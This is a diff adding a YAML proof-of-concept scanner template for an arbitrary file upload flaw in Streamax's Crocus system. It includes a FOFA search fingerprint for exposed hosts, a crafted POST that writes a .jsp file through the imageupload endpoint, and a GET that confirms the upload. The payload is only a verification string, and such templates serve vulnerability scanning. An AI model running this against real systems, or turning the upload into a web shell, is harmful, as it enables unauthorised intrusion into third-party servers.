@@ -1,0 +1,26 @@
+id: poc-yaml-crocus-imageupload-anyfile-upload
+info:
+  name: 锐明技术 Crocus系统 imageupload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: crocus
+  fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+  t3: base64(t2)
+requests:
+- method: POST
+  path: /RepairRecord.do?Action=imageupload
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"username\": \"streamax20020818\",\n  \"license\": \"1\",\n  \"chnnel\"\
+    : 1,\n  \"type\": 1,\n  \"imsage\": \"{{.t3}}\",\n  \"picturename\": \"{{.t1}}.jsp\"\
+    \n}"
+  expression: "status_code == 200 && \ncontains(body,\"\\\"Result\\\":true\") &&\n\
+    contains(content_type,\"text/json\") &&\n!contains(body,\"<\")\n"
+- method: GET
+  path: /SystemFile/PictureRecord/imageupload/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
